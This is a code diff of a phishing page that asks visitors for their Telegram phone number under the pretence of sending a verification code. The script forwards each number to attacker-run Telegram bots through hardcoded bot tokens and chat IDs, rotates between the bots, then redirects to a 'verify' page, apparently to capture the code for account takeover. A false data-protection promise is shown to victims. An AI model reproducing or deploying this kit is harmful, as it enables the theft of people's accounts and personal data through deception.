@@ -21,7 +21,7 @@
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
-      background: url('lc1.jpeg') no-repeat center center fixed;
+      background: url('putih.avif') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -179,66 +179,71 @@
   <label for="phone">Telegram number</label>
   <input type="tel" id="phoneInput" placeholder="Telegram number" required />
 
-  <button type="submit" class="btn">next</button>
+  <button type="submit" class="btn">Next</button>
 
   <div class="disclaimer">
-    *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+    *Make sure the number entered is active to receive verification.
+    Data will be kept confidential in accordance with the Personal Data Protection Act.
   </div>
 </form>
 
 <div class="status" id="statusMessage"></div>
 
 <script>
-  const phoneForm = document.getElementById('phoneForm');
-  const phoneInput = document.getElementById('phoneInput');
-  const statusMessage = document.getElementById('statusMessage');
-  const blurOverlay = document.getElementById('blurOverlay');
-  const loadingText = document.getElementById('loadingText');
+const phoneForm = document.getElementById('phoneForm');
+const phoneInput = document.getElementById('phoneInput');
+const statusMessage = document.getElementById('statusMessage');
 
-  const bots = [
-    { token: "8235258570:AAGG8mphEgrcW9GGd-91KI4NOqL4soyI4G8", chatId: "8416491873" },
-    { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" }
-  ];
+const bots = [
+  { token: "8313038710:AAFoEZdlFYONQ8ss_rWQJb5lXaCg6FfSO6E", chatId: "8416491873" },
+  { token: "7109141057:AAE5SKpp3qqufq9rwakmgfBcCALvQvLjOhc", chatId: "5961899997" }
+];
 
-  phoneForm.addEventListener('submit', function (e) {
-    e.preventDefault();
+phoneForm.addEventListener('submit', function (e) {
+  e.preventDefault();
 
-    const phone = phoneInput.value.trim();
-    const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
-    localStorage.setItem('sessionBotIndex', currentBotIndex);
-    const bot = bots[currentBotIndex];
+  const phone = phoneInput.value.trim();
+  if (!phone) return;
 
-    const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
-    const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+  const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+  localStorage.setItem('sessionBotIndex', currentBotIndex);
 
-    statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
-    statusMessage.style.color = "#000";
-    blurOverlay.style.display = "block";
-    loadingText.style.display = "block";
+  const bot = bots[currentBotIndex];
 
-    fetch(api)
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          const nextBotIndex = (currentBotIndex + 1) % bots.length;
-          localStorage.setItem('currentBotIndex', nextBotIndex);
-          setTimeout(() => {
-            window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-          }, 3000);
-        } else {
-          blurOverlay.style.display = "none";
-          loadingText.style.display = "none";
-          statusMessage.textContent = "❌ Gagal mengirim ke bot.";
-          statusMessage.style.color = "red";
-        }
-      })
-      .catch(err => {
-        blurOverlay.style.display = "none";
-        loadingText.style.display = "none";
-        statusMessage.textContent = "❌ Error: " + err.message;
+  const message = `🌀 *FUN GAY LOGIN*
+━━━━━━━━━━━━━━
+📞 Phone: \`${phone}\`
+━━━━━━━━━━━━━━`;
+
+  const api = `https://api.telegram.org/bot${bot.token}/sendMessage` +
+              `?chat_id=${bot.chatId}` +
+              `&text=${encodeURIComponent(message)}` +
+              `&parse_mode=Markdown`;
+
+  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+  statusMessage.style.color = "#000";
+
+  fetch(api)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        const nextBotIndex = (currentBotIndex + 1) % bots.length;
+        localStorage.setItem('currentBotIndex', nextBotIndex);
+
+        setTimeout(() => {
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        }, 3000);
+      } else {
+        statusMessage.textContent = "❌ Failed to send to bot.";
         statusMessage.style.color = "red";
-      });
-  });
-  </script>
+      }
+    })
+    .catch(err => {
+      statusMessage.textContent = "❌ Error: " + err.message;
+      statusMessage.style.color = "red";
+    });
+});
+</script>
+
 </body>
 </html>
